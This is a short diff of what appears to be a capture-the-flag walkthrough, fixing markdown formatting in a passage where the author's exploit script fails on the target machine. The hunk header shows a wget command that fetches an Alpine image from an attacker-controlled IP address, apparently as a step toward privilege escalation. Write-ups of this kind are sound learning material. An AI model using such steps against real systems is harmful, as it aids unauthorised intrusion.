@@ -324,7 +324,7 @@ wget 10.10.14.15/alpine-v3.19-x86_64-20231226_1430.tar.gz
 ; max-width: 900px;">
 <br/><br/>
 
-I even try to convert the script to **Unix* format with `dos2unix` and transfer it back to the victim machine, but it still doesn't work. Maybe it's problems in the directory I chose to host the exploit, but if I go to another one that wouldn't present that problem, **tmp**, it doesn't work either. I will look for another attack vector.
+I even try to convert the script to **Unix** format with `dos2unix` and transfer it back to the victim machine, but it still doesn't work. Maybe it's problems in the directory I chose to host the exploit, but if I go to another one that wouldn't present that problem, **tmp**, it doesn't work either. I will look for another attack vector.
 
 > **Attacker Machine**:
 
